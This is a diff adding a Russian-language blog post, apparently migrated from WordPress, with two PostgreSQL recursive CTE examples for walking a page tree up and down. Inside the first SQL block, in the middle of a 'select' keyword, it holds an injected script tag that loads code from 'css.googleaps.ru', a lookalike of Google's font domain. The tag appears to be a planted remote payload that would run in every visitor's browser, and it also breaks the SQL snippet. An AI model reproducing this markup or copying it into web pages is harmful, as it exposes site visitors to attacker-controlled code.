@@ -1,0 +1,54 @@
+---
+layout: post
+status: publish
+published: true
+title: Postgres рекурсивные запросы
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 1654
+wordpress_url: http://devdocs.ru/partners-news/postgres-rekursivnyie-zaprosyi/
+date: '2015-04-01 06:53:44 +0200'
+date_gmt: '2015-04-01 06:53:44 +0200'
+categories:
+- Yii framework
+- PostgreSQL
+tags:
+- post
+- sql
+- yii2
+- des1roer
+- postgresql
+comments: []
+---
+<div dir="ltr" style="text-align: left;">Запрос снизу вверх. 8 и 3 - потомки</p>
+<pre style="background: #000; color: #f8f8f8;">WITH RECURSIVE temp1 ( p_id, p_parent, p_title<br />
+ ) <span style="color: #e28964;">AS<&#47;span> (<br />
+<span style="color: #e28964;">SELECT<&#47;span> <span style="color: #3387cc;">T1<&#47;span>.<span style="color: #3387cc;">p_id<&#47;span>, <span style="color: #3387cc;">T1<&#47;span>.<span style="color: #3387cc;">p_parent<&#47;span>, <span style="color: #3387cc;">T1<&#47;span>.<span style="color: #3387cc;">p_title<&#47;span><br />
+<span style="color: #e28964;">FROM<&#47;span> <span style="color: #65b042;">"SC_Wonder"<&#47;span>.t_page T1<br />
+<span style="color: #e28964;">WHERE<&#47;span> <span style="color: #3387cc;">T1<&#47;span>.<span style="color: #3387cc;">p_id<&#47;span> <span style="color: #e28964;">=<&#47;span> <span style="color: #3387cc;">8<&#47;span> <span style="color: #e28964;">or<&#47;span> <span style="color: #3387cc;">T1<&#47;span>.<span style="color: #3387cc;">p_id<&#47;span> <span style="color: #e28964;">=<&#47;span> <span style="color: #3387cc;">3<&#47;span><br />
+<span style="color: #e28964;">union<&#47;span><br />
+<span style="color: #e28964;">select<&#47;span> <span style="color: #3387cc;">T2<&#47;span>.<span style="color: #3387cc;">p_id<&#47;span>, <span style="color: #3387cc;">T2<&#47;span>.<span style="color: #3387cc;">p_parent<&#47;span>, <span style="color: #3387cc;">T2<&#47;span>.<span style="color: #3387cc;">p_title<&#47;span><br />
+<span style="color: #e28964;">FROM<&#47;span> <span style="color: #65b042;">"SC_Wonder"<&#47;span>.t_page T2<br />
+<span style="color: #e28964;">INNER JOIN<&#47;span> temp1 <span style="color: #e28964;">ON<&#47;span> (<span style="color: #3387cc;">temp1<&#47;span>.<span style="color: #3387cc;">p_parent<&#47;span> <span style="color: #e28964;">=<&#47;span> <span style="color: #3387cc;">T2<&#47;span>.<span style="color: #3387cc;">p_id<&#47;span>))<br />
+<span style="color: #e28964;">select<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;span> <span style="color: #e28964;">*<&#47;span> <span style="color: #e28964;">from<&#47;span> temp1 <span style="color: #e28964;">order by<&#47;span> p_parent <span style="color: #e28964;">desc<&#47;span><&#47;pre><br />
+..<br />
+Запрос сверху вниз. элемент с прдком 0 - корневой элемент</p>
+<pre style="background: #000; color: #f8f8f8;">WITH RECURSIVE temp1 ( p_id,p_parent,p_title,<span style="color: #99cf50;">PATH<&#47;span>, LEVEL, NAME  ) <span style="color: #e28964;">AS<&#47;span> (<br />
+<span style="color: #e28964;">SELECT<&#47;span> <span style="color: #3387cc;">T1<&#47;span>.<span style="color: #3387cc;">p_id<&#47;span>,<span style="color: #3387cc;">T1<&#47;span>.<span style="color: #3387cc;">p_parent<&#47;span>, <span style="color: #3387cc;">T1<&#47;span>.<span style="color: #3387cc;">p_title<&#47;span>,<br />
+CAST (<span style="color: #3387cc;">T1<&#47;span>.<span style="color: #3387cc;">p_id<&#47;span> <span style="color: #e28964;">AS<&#47;span> <span style="color: #99cf50;">VARCHAR<&#47;span> (<span style="color: #3387cc;">50<&#47;span>)) <span style="color: #e28964;">as<&#47;span> <span style="color: #99cf50;">PATH<&#47;span>, <span style="color: #3387cc;">1<&#47;span> ,<br />
+CAST (<span style="color: #3387cc;">T1<&#47;span>.<span style="color: #3387cc;">p_title<&#47;span> <span style="color: #e28964;">AS<&#47;span> <span style="color: #99cf50;">VARCHAR<&#47;span> (<span style="color: #3387cc;">255<&#47;span>)) <span style="color: #e28964;">as<&#47;span> NAME<br />
+    <span style="color: #e28964;">FROM<&#47;span> <span style="color: #65b042;">"SC_Wonder"<&#47;span>.t_page T1 <span style="color: #e28964;">WHERE<&#47;span> <span style="color: #3387cc;">T1<&#47;span>.<span style="color: #3387cc;">p_parent<&#47;span> <span style="color: #e28964;">=<&#47;span> <span style="color: #3387cc;">0<&#47;span><br />
+<span style="color: #e28964;">union<&#47;span><br />
+<span style="color: #e28964;">select<&#47;span> <span style="color: #3387cc;">T2<&#47;span>.<span style="color: #3387cc;">p_id<&#47;span>, <span style="color: #3387cc;">T2<&#47;span>.<span style="color: #3387cc;">p_parent<&#47;span>, <span style="color: #3387cc;">T2<&#47;span>.<span style="color: #3387cc;">p_title<&#47;span>,<br />
+CAST ( <span style="color: #3387cc;">temp1<&#47;span>.<span style="color: #3387cc;">PATH<&#47;span> <span style="color: #e28964;">||<&#47;span><span style="color: #65b042;">'->'<&#47;span><span style="color: #e28964;">||<&#47;span> <span style="color: #3387cc;">T2<&#47;span>.<span style="color: #3387cc;">p_id<&#47;span> <span style="color: #e28964;">AS<&#47;span> <span style="color: #99cf50;">VARCHAR<&#47;span>(<span style="color: #3387cc;">50<&#47;span>)) ,LEVEL <span style="color: #e28964;">+<&#47;span> <span style="color: #3387cc;">1<&#47;span> ,<br />
+CAST ((repeat(<span style="color: #65b042;">'  '<&#47;span>, LEVEL<span style="color: #e28964;">+<&#47;span><span style="color: #3387cc;">1<&#47;span>)<span style="color: #e28964;">||<&#47;span><span style="color: #3387cc;">T2<&#47;span>.<span style="color: #3387cc;">p_title<&#47;span>) <span style="color: #e28964;">AS<&#47;span> <span style="color: #99cf50;">VARCHAR<&#47;span>(<span style="color: #3387cc;">255<&#47;span>))<br />
+     <span style="color: #e28964;">FROM<&#47;span> <span style="color: #65b042;">"SC_Wonder"<&#47;span>.t_page T2 <span style="color: #e28964;">INNER JOIN<&#47;span> temp1 <span style="color: #e28964;">ON<&#47;span>( <span style="color: #3387cc;">temp1<&#47;span>.<span style="color: #3387cc;">p_id<&#47;span><span style="color: #e28964;">=<&#47;span> <span style="color: #3387cc;">T2<&#47;span>.<span style="color: #3387cc;">p_parent<&#47;span>))<br />
+<span style="color: #e28964;">select<&#47;span> <span style="color: #e28964;">*<&#47;span> <span style="color: #e28964;">from<&#47;span> temp1 <span style="color: #e28964;">ORDER BY<&#47;span> <span style="color: #99cf50;">PATH<&#47;span> <span style="color: #e28964;">LIMIT<&#47;span> <span style="color: #3387cc;">100<&#47;span><&#47;pre><br />
+..</p>
+<p><&#47;div><br />
+Source: des1roer.blogspot.com</p>
